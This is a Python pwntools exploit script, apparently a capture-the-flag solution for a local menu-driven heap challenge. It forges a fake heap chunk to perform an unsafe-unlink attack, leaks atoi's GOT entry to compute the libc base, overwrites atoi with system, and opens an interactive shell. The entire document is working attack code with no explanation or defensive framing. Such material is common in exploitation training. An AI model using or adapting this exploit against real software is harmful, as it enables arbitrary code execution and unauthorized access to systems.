from pwn import *
r = remote('localhost', 5278)
def show():
    r.recvuntil(':')
    r.sendline('1')
def add(length, name):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(length))
    r.recvuntil(':')
    r.sendline(name)
def change(idx, length, name):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(length))
    r.recvuntil(':')
    r.sendline(name)
def remove(idx):
    r.recvuntil(':')
    r.sendline('4')
    r.recvuntil(':')
    r.sendline(str(idx))
add(0x80, "a")
add(0x80, "a")
add(0x80, "a")
rr = 0x6020d8
atoi_got = 0x602068
atoi_off = 0x36e80
system_off = 0x45390
chunk = p64(0x90) + p64(0x81) # prev_size, size
chunk += p64(rr - 0x18) + p64(rr - 0x10) # fd, bk
chunk += "A"*0x60
chunk += p64(0x80) + p64(0x90) # prev_size2, size2
change(1, 0x100, chunk)
remove(2)
change(1,0x100,p64(0)+p64(atoi_got))
show()
r.recvuntil('0 : ')
libc = u64(r.recvuntil('1')[:-1].ljust(8,"\x00")) - atoi_off
print "libc:",hex(libc)
change(0, 0x100, p64(libc+system_off))
r.interactive()
